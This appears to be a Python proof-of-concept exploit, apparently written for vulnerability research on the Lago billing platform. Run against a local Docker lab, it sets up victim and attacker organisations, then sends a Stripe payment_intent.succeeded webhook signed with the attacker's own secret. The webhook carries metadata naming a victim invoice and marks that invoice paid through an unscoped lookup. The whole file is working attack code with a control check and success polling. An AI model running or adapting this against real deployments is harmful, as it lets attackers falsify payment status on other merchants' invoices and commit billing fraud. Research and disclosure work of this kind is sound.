#!/usr/bin/env python3
"""Local oracle: Lago Stripe one-time webhook pays any invoice UUID.

Attacker org signs payment_intent.succeeded with their webhook secret.
metadata.payment_type=one-time + lago_invoice_id=<victim> skips the org-scoped
handle_missing_payment path. Invoice.find_by(id:) has no organization_id.

Witness: victim invoice payment_status=succeeded. Dummy Stripe event, no charge
to the victim merchant. Loopback only. Not a shell.
"""
from __future__ import annotations

import hashlib
import hmac
import json
import os
import subprocess
import sys
import time
import uuid
import urllib.error
import urllib.request
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any, NoReturn

SUCCESS_LINE = "SUCCESS Lago Stripe one-time webhook unscoped invoice"
DEFAULT_API = "http://127.0.0.1:13001"
COMPOSE_PROJECT = "lago-stripe-invoice-idor"
WEBHOOK_SECRET = "lab_stripe_webhook_secret_32b"
PASSWORD = "ILoveLago-Lab-1"
USER_AGENT = "lago-stripe-idor-lab"
HTTP_TIMEOUT_S = 60
CONTROL_SLEEP_S = 8
POLL_ATTEMPTS = 20
POLL_SLEEP_S = 3
AMOUNT_CENTS = 1000
HERE = Path(__file__).resolve().parent

REGISTER = """
mutation($input: RegisterUserInput!) {
  registerUser(input: $input) {
    token
    user { id email }
    organization { id name }
  }
}
"""


def fail(reason: str) -> NoReturn:
    print(f"FAIL {reason}")
    raise SystemExit(1)


def _ioc_value(dump: str, marker: str) -> str:
    hits = [ln.split("=", 1)[1].strip() for ln in dump.splitlines() if marker in ln]
    return hits[-1]


def stripe_sig(payload: bytes, secret: str) -> str:
    ts = int(time.time())
    mac = hmac.new(secret.encode(), f"{ts}.".encode() + payload, hashlib.sha256).hexdigest()
    return f"t={ts},v1={mac}"


def payment_intent_event(invoice_id: str, payment_type: str | None) -> bytes:
    meta: dict[str, str] = {"lago_invoice_id": invoice_id, "lago_payable_type": "Invoice"}
    if payment_type:
        meta["payment_type"] = payment_type
    obj: dict[str, Any] = {
        "id": f"evt_{uuid.uuid4().hex[:16]}",
        "object": "event",
        "type": "payment_intent.succeeded",
        "livemode": False,
        "data": {
            "object": {
                "id": f"pi_{uuid.uuid4().hex[:16]}",
                "object": "payment_intent",
                "amount": AMOUNT_CENTS,
                "currency": "usd",
                "status": "succeeded",
                "payment_method": "pm_lab",
                "metadata": meta,
            }
        },
    }
    return json.dumps(obj, separators=(",", ":")).encode("utf-8")


@dataclass(frozen=True)
class LabConfig:
    api: str
    suffix: str
    webhook_secret: str = WEBHOOK_SECRET
    password: str = PASSWORD
    compose_project: str = COMPOSE_PROJECT
    here: Path = field(default_factory=lambda: HERE)

    @property
    def victim_email(self) -> str:
        return f"victim-{self.suffix}@lab.local"

    @property
    def attacker_email(self) -> str:
        return f"attacker-{self.suffix}@lab.local"

    @property
    def victim_org(self) -> str:
        return f"Victim Corp {self.suffix}"

    @property
    def attacker_org(self) -> str:
        return f"Attacker Corp {self.suffix}"

    @classmethod
    def from_argv(cls, argv: list[str]) -> LabConfig:
        api = (argv[1] if len(argv) > 1 else DEFAULT_API).rstrip("/")
        suffix = os.environ.get("LAGO_POC_SUFFIX") or uuid.uuid4().hex[:8]
        return cls(api=api, suffix=suffix)


def http(
    cfg: LabConfig,
    method: str,
    path: str,
    *,
    body: dict[str, Any] | None = None,
    headers: dict[str, str] | None = None,
    raw: bytes | None = None,
) -> tuple[int, str]:
    url = path if path.startswith("http") else cfg.api + path
    hdrs = {"User-Agent": USER_AGENT}
    if headers:
        hdrs.update(headers)
    data = raw
    if body is not None and data is None:
        data = json.dumps(body).encode("utf-8")
        hdrs.setdefault("Content-Type", "application/json")
    req = urllib.request.Request(url, data=data, headers=hdrs, method=method)
    try:
        with urllib.request.urlopen(req, timeout=HTTP_TIMEOUT_S) as resp:
            return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        return exc.code, exc.read().decode("utf-8", "replace")


def gql(
    cfg: LabConfig,
    query: str,
    variables: dict[str, Any] | None = None,
    token: str | None = None,
    org: str | None = None,
) -> dict[str, Any]:
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = f"Bearer {token}"
    if org:
        headers["x-lago-organization"] = org
    code, text = http(
        cfg,
        "POST",
        "/graphql",
        body={"query": query, "variables": variables or {}},
        headers=headers,
    )
    try:
        payload: dict[str, Any] = json.loads(text)
    except json.JSONDecodeError:
        fail(f"graphql http={code} body={text[:500]}")
    return payload


def data(payload: dict[str, Any], *path: str) -> Any:
    cur: Any = payload.get("data") or {}
    for key in path:
        if not isinstance(cur, dict) or key not in cur:
            fail(f"missing {'/'.join(path)} in {json.dumps(payload)[:800]}")
        cur = cur[key]
    return cur


def rest(
    cfg: LabConfig,
    method: str,
    path: str,
    api_key: str,
    body: dict[str, Any] | None = None,
) -> tuple[int, dict[str, Any] | str]:
    code, text = http(
        cfg,
        method,
        path,
        body=body,
        headers={"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"},
    )
    try:
        parsed: dict[str, Any] = json.loads(text)
        return code, parsed
    except json.JSONDecodeError:
        return code, text


def _container(cfg: LabConfig) -> str:
    proc = subprocess.run(
        ["docker", "compose", "-p", cfg.compose_project, "ps", "-q", "lago"],
        capture_output=True,
        text=True,
        cwd=cfg.here,
        timeout=30,
    )
    cid = (proc.stdout or "").strip().splitlines()[-1] if proc.stdout else ""
    if not cid:
        fail("no lago container")
    return cid


def rails(cfg: LabConfig, ruby: str) -> str:
    cid = _container(cfg)
    subprocess.run(
        ["docker", "exec", "-i", cid, "bash", "-lc", "cat > /tmp/lago_lab.rb"],
        input=ruby,
        text=True,
        check=True,
        timeout=30,
    )
    proc = subprocess.run(
        [
            "docker",
            "exec",
            "-w",
            "/app/api",
            cid,
            "bash",
            "-lc",
            "set -a; source /data/.env; set +a; bundle exec rails runner /tmp/lago_lab.rb",
        ],
        capture_output=True,
        text=True,
        timeout=120,
    )
    out = (proc.stdout or "") + (proc.stderr or "")
    if proc.returncode != 0:
        fail(f"rails rc={proc.returncode} {out[-1500:]}")
    return out


def register(cfg: LabConfig, email: str, org_name: str) -> tuple[str, str, str]:
    payload = gql(
        cfg,
        REGISTER,
        {"input": {"email": email, "password": cfg.password, "organizationName": org_name}},
    )
    if payload.get("errors"):
        fail(f"register {email} {json.dumps(payload['errors'])[:800]}")
    token = data(payload, "registerUser", "token")
    org_id = data(payload, "registerUser", "organization", "id")
    print(f"IOC register email={email} org={org_id}")
    return token, org_id, org_name


def _snippet(body: dict[str, Any] | str, limit: int) -> str:
    if isinstance(body, str):
        return repr(body[:limit])
    return repr(json.dumps(body)[:limit])


def _seed_ruby(attacker_org: str, victim_org: str, victim_customer_id: str, secret: str) -> str:
    return f"""
attacker_org_id = {attacker_org!r}
victim_org_id = {victim_org!r}
victim_customer_id = {victim_customer_id!r}
webhook_secret = {secret!r}
[attacker_org_id, victim_org_id].each do |oid|
  p = PaymentProviders::StripeProvider.find_or_initialize_by(organization_id: oid, code: "stripe_lab")
  p.name = "Stripe Lab"
  p.secret_key = "sk_test_lab_" + oid.delete("-")[0, 12]
  p.webhook_secret = webhook_secret
  p.save!
  puts "IOC stripe_provider org=" + oid + " id=" + p.id
end
cust = Customer.find(victim_customer_id)
victim_provider = PaymentProviders::StripeProvider.find_by!(organization_id: victim_org_id, code: "stripe_lab")
cust.update!(payment_provider: "stripe", payment_provider_code: "stripe_lab")
sc = PaymentProviderCustomers::StripeCustomer.find_or_initialize_by(customer_id: cust.id, organization_id: victim_org_id)
sc.payment_provider_id = victim_provider.id
sc.provider_customer_id = "cus_lab_victim"
sc.provider_payment_methods = ["card"]
sc.save!
puts "IOC stripe_customer id=" + sc.id
puts "IOC stripe-seeded"
"""


def prove(cfg: LabConfig) -> int:
    print(f"IOC api={cfg.api} suffix={cfg.suffix}")
    _v_token, victim_org, _ = register(cfg, cfg.victim_email, cfg.victim_org)
    _a_token, attacker_org, _ = register(cfg, cfg.attacker_email, cfg.attacker_org)

    dump = rails(
        cfg,
        f"o=Organization.find({victim_org!r}); puts %(IOC victim_api_key=#{{o.api_keys.first.value}})",
    )
    print(dump[-400:])
    if "IOC victim_api_key=" not in dump:
        fail("could not read victim API key")
    victim_key = _ioc_value(dump, "IOC victim_api_key=")

    dump = rails(
        cfg,
        f"o=Organization.find({attacker_org!r}); puts %(IOC attacker_api_key=#{{o.api_keys.first.value}})",
    )
    attacker_key = _ioc_value(dump, "IOC attacker_api_key=")
    print(f"IOC keys victim_len={len(victim_key)} attacker_len={len(attacker_key)}")

    code, body = rest(
        cfg,
        "POST",
        "/api/v1/add_ons",
        victim_key,
        {
            "add_on": {
                "name": "Setup",
                "code": f"setup-{cfg.suffix}",
                "amount_cents": AMOUNT_CENTS,
                "amount_currency": "USD",
            }
        },
    )
    print(f"IOC add_on status={code} snippet={_snippet(body, 220)}")
    if code >= 300:
        fail("create add_on")

    code, body = rest(
        cfg,
        "POST",
        "/api/v1/customers",
        victim_key,
        {"customer": {"external_id": f"cust-{cfg.suffix}", "name": "Victim Customer", "currency": "USD"}},
    )
    print(f"IOC customer status={code}")
    if code >= 300:
        fail(f"create customer {body}")
    if not isinstance(body, dict):
        fail(f"create customer {body}")
    victim_customer_id = body["customer"]["lago_id"]
    print(f"IOC victim_customer={victim_customer_id}")

    seed = rails(cfg, _seed_ruby(attacker_org, victim_org, victim_customer_id, cfg.webhook_secret))
    print(seed[-800:])
    if "IOC stripe-seeded" not in seed:
        fail("stripe seed")

    code, body = rest(
        cfg,
        "POST",
        "/api/v1/invoices",
        victim_key,
        {
            "invoice": {
                "external_customer_id": f"cust-{cfg.suffix}",
                "currency": "USD",
                "skip_psp": True,
                "fees": [{"add_on_code": f"setup-{cfg.suffix}", "unit_amount_cents": AMOUNT_CENTS, "units": 1}],
            }
        },
    )
    print(f"IOC invoice status={code} snippet={_snippet(body, 300)}")
    if code >= 300:
        fail("create invoice")
    if not isinstance(body, dict):
        fail("create invoice")
    invoice = body["invoice"]
    invoice_id = invoice["lago_id"]
    before = invoice.get("payment_status")
    print(f"IOC invoice_id={invoice_id} payment_status_before={before}")
    if before == "succeeded":
        fail("invoice already succeeded")

    # Control: missing payment_type should stay pending (scoped handle_missing_payment).
    control = payment_intent_event(invoice_id, None)
    code, text = http(
        cfg,
        "POST",
        f"/webhooks/stripe/{attacker_org}",
        raw=control,
        headers={"Content-Type": "application/json", "Stripe-Signature": stripe_sig(control, cfg.webhook_secret)},
    )
    print(f"IOC control webhook status={code} body={text[:80]!r}")
    time.sleep(CONTROL_SLEEP_S)
    code, body = rest(cfg, "GET", f"/api/v1/invoices/{invoice_id}", victim_key)
    mid = body["invoice"]["payment_status"] if isinstance(body, dict) and "invoice" in body else body
    print(f"IOC payment_status_after_control={mid}")
    if mid == "succeeded":
        fail("control webhook (no one-time) already succeeded — org scope missing entirely")

    attack = payment_intent_event(invoice_id, "one-time")
    code, text = http(
        cfg,
        "POST",
        f"/webhooks/stripe/{attacker_org}",
        raw=attack,
        headers={"Content-Type": "application/json", "Stripe-Signature": stripe_sig(attack, cfg.webhook_secret)},
    )
    print(f"IOC attack webhook status={code} body={text[:80]!r}")
    if code >= 300:
        fail("attack webhook rejected")

    after = None
    for i in range(POLL_ATTEMPTS):
        time.sleep(POLL_SLEEP_S)
        code, body = rest(cfg, "GET", f"/api/v1/invoices/{invoice_id}", victim_key)
        if isinstance(body, dict) and "invoice" in body:
            after = body["invoice"]["payment_status"]
            paid = body["invoice"].get("total_paid_amount_cents")
            print(f"IOC poll i={i} payment_status={after} paid={paid}")
            if after == "succeeded":
                print(SUCCESS_LINE)
                return 0
    fail(f"invoice stayed {after} (need Sidekiq / stripe_customer / one-time path)")


def main() -> int:
    return prove(LabConfig.from_argv(sys.argv))


if __name__ == "__main__":
    raise SystemExit(main())
